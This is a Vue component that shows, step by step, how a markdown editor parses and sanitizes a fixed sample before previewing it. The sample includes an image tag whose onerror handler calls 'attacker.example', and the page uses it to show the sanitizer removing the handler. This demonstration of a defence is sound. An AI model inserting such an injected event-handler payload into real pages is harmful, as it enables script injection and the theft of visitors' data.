<script setup lang="ts">
/**
 * Technical Details: what happens between a keystroke and the preview.
 *
 * Each stage shows the real intermediate result for one fixed sample, produced
 * by the same parser and sanitizer the editor uses.
 */
import { getMarkdownIt, renderMarkdown } from '~/utils/markdown/config'

// The image is one this site really serves, so the last stage shows a picture
// rather than a broken-image icon (and a 404 in the console).
const SAMPLE = `## Findings

Arrests fell **12%** in 2025.

<img src="/images/icjia-logo.png" alt="ICJIA" width="96" onerror="sendTo('attacker.example')">`

const mounted = ref(false)
onMounted(() => { mounted.value = true })

const current = ref(0)

/** Drops the bookkeeping attributes the editor adds for scroll sync and anchors. */
function tidy(html: string): string {
  return html
    .replace(/ (?:data-source-line|tabindex|aria-hidden|id|class)="[^"]*"/g, '')
    .replace(/<a href="#[^"]*">([\s\S]*?)<\/a>/g, '$1')
    .trim()
}

const parsed = computed(() => (mounted.value ? tidy(getMarkdownIt().render(SAMPLE)) : ''))
// Sanitized only once the visitor reaches the step that shows it. Chromium
// reports a Content-Security-Policy violation whenever a parser creates an
// inline event-handler attribute — even in the inert document the sanitizer
// parses into, where nothing can run — so sanitizing this sample on page load
// would log a console error on every visit for an attack that was stopped.
const sanitized = computed(() => (mounted.value && current.value >= 2 ? renderMarkdown(SAMPLE) : ''))

const stages = [
  {
    name: 'You type',
    title: 'Plain text, exactly as typed',
    body: 'Two pound signs mean “this is a heading.” Two asterisks mean “this is bold.” The last line is not markdown at all. It is a snippet of web code, the kind that can arrive unnoticed when you paste from another source or open someone else’s file.',
  },
  {
    name: 'The parser reads it',
    title: 'Marks become structure',
    body: 'About a sixth of a second after you pause, a parser reads the text and writes the web code a browser understands: a real heading, a real paragraph, real bold. This happens in the background, so even an enormous document cannot make the editor stutter. The pasted snippet is passed through untouched, including the part that tries to run a command.',
  },
  {
    name: 'The sanitizer checks it',
    title: 'Anything that could act is removed',
    body: 'Before a single character reaches the screen, a sanitizer compares the result against a list of what a document is allowed to contain. Text, headings, tables and images are on the list. Commands are not. The image stays; the instruction attached to it is gone.',
  },
  {
    name: 'The preview shows it',
    title: 'What you and your readers see',
    body: 'Only the checked version is ever displayed, copied or exported. The same three steps run for the preview, for Copy HTML and for Download HTML, so the three can never disagree.',
  },
] as const

const stage = computed(() => stages[current.value]!)

const code = computed(() => {
  if (current.value === 0) return SAMPLE
  if (current.value === 1) return parsed.value
  return tidy(sanitized.value)
})
</script>

<template>
  <div class="td-pipeline">
    <ol class="td-steps">
      <li v-for="(s, i) in stages" :key="s.name">
        <button
          type="button"
          class="td-step"
          :aria-pressed="current === i"
          @click="current = i"
        >
          <span class="td-step-num" aria-hidden="true">{{ i + 1 }}</span>
          {{ s.name }}
        </button>
      </li>
    </ol>

    <div class="td-stage" aria-live="polite">
      <div class="td-stage-text">
        <h3>{{ stage.title }}</h3>
        <p>{{ stage.body }}</p>
        <div class="td-stage-nav">
          <button type="button" class="td-btn" :disabled="current === 0" @click="current--">
            Back
          </button>
          <button
            type="button"
            class="td-btn td-btn-primary"
            :disabled="current === stages.length - 1"
            @click="current++"
          >
            Next step
          </button>
        </div>
      </div>
      <!-- eslint-disable vue/no-v-html -- sanitized by renderMarkdown() -->
      <div
        v-if="current === 3"
        class="td-stage-view td-rendered"
        v-html="sanitized.replace(/<h2/g, '<h4').replace(/<\/h2>/g, '</h4>')"
      />
      <!-- eslint-enable vue/no-v-html -->
      <pre v-else class="td-stage-view td-code" tabindex="0" role="group" aria-label="Result at this step"><code>{{ code }}</code></pre>
    </div>
  </div>
</template>
